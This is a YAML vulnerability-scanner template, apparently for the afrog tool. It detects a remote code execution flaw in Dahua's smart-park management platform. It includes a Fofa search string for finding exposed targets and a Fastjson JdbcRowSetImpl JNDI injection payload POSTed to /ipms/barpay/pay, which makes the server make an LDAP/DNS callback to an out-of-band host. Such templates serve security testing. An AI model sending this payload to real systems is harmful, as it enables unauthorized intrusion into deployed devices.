id: dahua-ipms-rce

info:
  name: 大华智慧园区综合管理平台 ipms 远程代码执行漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |
    Fofa: body="/WPMS"
    header_string = "hauc"
  tags: dahua,rce
  created: 2023/09/04

set:
  oob: oob()
  oobDNS: oob.DNS
rules:
  r0:
    request:
      method: POST
      path: /ipms/barpay/pay
      headers:
        Content-Type: application/json
      body: |
        {"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://{{oobDNS}}}", "autoCommit": true}
    expression: oobCheck(oob, oob.ProtocolDNS, 3)
expression: r0()
